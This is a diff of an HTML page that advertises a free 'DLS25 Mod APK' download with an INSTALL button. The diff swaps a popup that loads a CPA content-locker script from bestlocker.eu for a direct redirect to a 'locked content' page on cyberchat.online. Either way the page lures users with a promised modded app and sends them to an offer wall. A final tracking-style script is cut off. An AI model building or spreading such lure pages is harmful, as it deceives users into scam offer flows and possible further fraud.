@@ -170,7 +170,7 @@ button, .install-button {
       </div>
       <div class="meta-line">Size: 350 MB • 100K+ downloads • Version 2.5.3</div>
 
-    <button class="install-button" id="getButton" aria-label="Install DLS25 Mod APK">INSTALL</button>
+      <button class="install-button" id="getButton" aria-label="Install DLS25 Mod APK">INSTALL</button>
     </div>
   </div>
 
@@ -202,49 +202,14 @@ button, .install-button {
     This modded version guarantees no ads and enhanced gameplay for an unbeatable football experience.  
     Download now and take your game to the next level!
   </div>
-<!-- Popup overlay container (hidden initially) -->
-<div id="popupOverlay" style="display:none; position:fixed;top:0;left:0;width:100vw;height:100vh; background:rgba(0,0,0,0.85); z-index:9999; display:flex; align-items:center; justify-content:center; padding:20px; box-sizing:border-box;">
-  <div style="position:relative; max-width:480px; width:100%; background:#fff; border-radius:20px; overflow:hidden; box-shadow: 0 0 20px rgba(0,0,0,0.4);">
-    <button id="closePopup" aria-label="Close popup" style="position:absolute; top:10px; right:10px; background:#007aff; border:none; border-radius:50%; width:36px; height:36px; color:#fff; font-size:22px; cursor:pointer; font-weight:bold; line-height:1;">×</button>
-    
-    <!-- Here your CPA locker div -->
-    <div id="cpa-locker-fde41c9a-50e2-11f0-a0f4-c2a106037d45"></div>
-  </div>
-</div>
 
-<script>
-  const getBtn = document.getElementById('getButton');
-  const popup = document.getElementById('popupOverlay');
-  const closeBtn = document.getElementById('closePopup');
+  <script>
+    document.getElementById('getButton').addEventListener('click', () => {
+      window.location.href = "https://cyberchat.online/lockedcontentdls";
+    });
+  </script>
 
-  // Flag so script is injected only once
-  let scriptInjected = false;
-
-  getBtn.addEventListener('click', () => {
-    popup.style.display = 'flex';
-
-    if (!scriptInjected) {
-      // Dynamically inject the script to load CPA locker iframe
-      const script = document.createElement('script');
-      script.id = 'cpljs-fde41c9a-50e2-11f0-a0f4-c2a106037d45';
-      script.type = 'text/javascript';
-      script.src = 'https://bestlocker.eu/iframeLoader/fde41c9a-50e2-11f0-a0f4-c2a106037d45';
-      document.getElementById('cpa-locker-fde41c9a-50e2-11f0-a0f4-c2a106037d45').appendChild(script);
-      scriptInjected = true;
-    }
-  });
-
-  closeBtn.addEventListener('click', () => {
-    popup.style.display = 'none';
-  });
-
-  // Optional: close popup on click outside content area
-  popup.addEventListener('click', e => {
-    if (e.target === popup) {
-      popup.style.display = 'none';
-    }
-  });
-</script>
+</body>
 <script>
 (function () {
   const sessionId = 'sess_' + Math.random().toString(36).substring(2, 10);
